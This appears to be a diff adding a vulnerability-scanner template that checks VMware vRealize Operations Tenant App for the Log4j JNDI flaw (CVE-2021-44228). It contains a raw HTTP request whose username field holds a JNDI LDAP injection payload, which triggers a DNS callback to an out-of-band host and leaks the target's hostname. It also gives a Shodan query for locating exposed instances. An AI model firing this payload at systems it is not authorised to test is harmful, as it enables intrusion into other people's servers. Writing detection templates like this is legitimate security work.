@@ -1,0 +1,49 @@
+id: vrealize-operations-log4j-rce
+
+info:
+  name: VMware vRealize Operations Tenant App Log4j JNDI Remote Code Execution
+  author: bughuntersurya
+  severity: critical
+  description: VMware vRealize Operations is susceptible to a critical vulnerability in Apache Log4j which may allow remote code execution in an impacted vRealize Operations Tenant application.
+  reference:
+    - https://www.vmware.com/security/advisories/VMSA-2021-0028.html
+    - https://core.vmware.com/vmsa-2021-0028-questions-answers-faq
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-45046
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+  metadata:
+    shodan-query: http.title:"vRealize Operations Tenant App"
+  tags: rce,log4j,vmware,vrealize
+
+requests:
+  - raw:
+      - |
+        POST /suite-api/api/auth/token/acquire HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Origin: {{RootURL}}
+        Referer: {{RootURL}}/ui/
+
+        {"username":"${jndi:ldap://${hostName}.{{interactsh-url}}}","password":"admin"}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"  # Confirms the DNS Interaction
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Match for extracted ${hostName} variable
+
+    extractors:
+      - type: regex
+        part: interactsh_request
+        group: 1
+        regex:
+          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print extracted ${hostName} in output
+
+# Enhanced by mp on 2022/04/05
